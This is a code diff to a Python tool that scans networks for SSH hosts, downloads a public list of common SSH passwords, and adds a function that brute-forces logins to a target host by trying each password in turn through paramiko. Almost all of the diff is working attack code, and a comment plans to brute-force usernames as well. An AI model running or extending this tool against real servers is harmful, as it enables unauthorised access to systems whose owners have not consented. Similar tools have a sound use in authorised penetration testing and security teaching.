@@ -11,6 +11,7 @@ import logging
 import socket
 from urllib.request import urlopen
 import urllib
+import time
 
 # ------------------- Logging ----------------------- #
 logger = logging.getLogger(__name__)
@@ -74,18 +75,20 @@ def scan_ssh_hosts():
     return all_hosts
 
 
-def download_ssh_passwords():
+def download_ssh_passwords(filename):
     """
      Downloads most commonly used ssh passwords from a specific url
       Clearly, you can store passwords in a dictionary, but i found this more comfortable
 
+    Args:
+        filename - Name to save the file as.
     """
 
     # TODO: Move these passwords to my own website.
 
     debug_print("Downloading passwords...")
     url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"
-    urllib.request.urlretrieve(url, "passwords.txt")
+    urllib.request.urlretrieve(url, filename)
     debug_print("Passwords downloaded!")
 
 
@@ -117,3 +120,23 @@ def connect_to_ssh(host, password):
     except paramiko.ssh_exception.AuthenticationException:
         debug_print("Wrong Password or Username")
         return False
+    except paramiko.ssh_exception.SSHException as e:
+        # socket is open, but not SSH service responded
+        return False
+
+    
+def bruteforce_ssh(host, wordlist):
+    """
+    Calls connect_to_ssh function and
+    tries to bruteforce the target server.
+
+    Args:
+        wordlist - TXT file with passwords
+
+    """
+    # TODO : Bruteforce usernames too
+    file = open(wordlist, "r")
+    for line in file:
+        connection = connect_to_ssh(host, line)
+        print(connection)
+        time.sleep(5)
